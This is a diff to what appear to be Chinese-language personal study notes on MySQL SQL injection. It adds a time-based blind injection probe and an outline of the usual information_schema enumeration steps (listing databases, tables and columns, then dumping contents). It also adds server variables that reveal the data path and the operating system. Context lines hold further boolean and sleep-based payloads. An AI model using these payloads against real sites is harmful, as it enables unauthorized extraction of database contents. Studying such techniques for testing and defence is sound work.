@@ -3,13 +3,29 @@
 ## 判断sql注入的语句
 
 1. `and sleep(2)`
-    > If(ascii(substr(database(),1,1))>115,0,sleep(5))%#
+    > If(ascii(substr(database(),1,1))>115,0,sleep(5))%#  
+if(length(database())=12,sleep(5),1)
+
 2. `and if(1=1,1,1)=1`
     > 正常执行的话，等于1正常返回，其他数值报错。这是一个类似三元运算符的东西。算式成立返回第一个值，否则返回第二个值
 3. `if(1=(select 1 REGEXP if(1=1,1,0x00)),1,1)=1`
     > REGEXP 是模糊查询。这样执行`select 2 REGEXP 2;`,会返回1，匹配不到会返回0
 4. `left(user(),1)="r"`
     > 查询用户名的第一个字母
+
+## 基本的查询
+
+    ```
+    Mysql 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。  
+    猜数据库  
+    select schema_name from information_schema.schemata  
+    猜某库的数据表  
+    select table_name from information_schema.tables where table_schema=’xxxxx’  
+    猜某表的所有列  
+    Select column_name from information_schema.columns where table_name=’xxxxx’  
+    获取某列的内容  
+    Select *** from ****
+    ```
 
 ```mysql
 暂时还没测试成功的......有没有路过的野生大神讲解一下。。。
@@ -105,6 +121,8 @@ IFNULL(1/(locate(right(left(lower(user()),1),1),'r')),' yes’)
     5:database()     返回当前数据库名
     6:version()      返回当前数据库版本信息
     7:load_file()    返回文件的内容
+    8.@@datadir      数据库路径  
+    9.@@version_compile_os  操作系统版本  
 
     substr(string string,num start,num length);
     string为字符串；
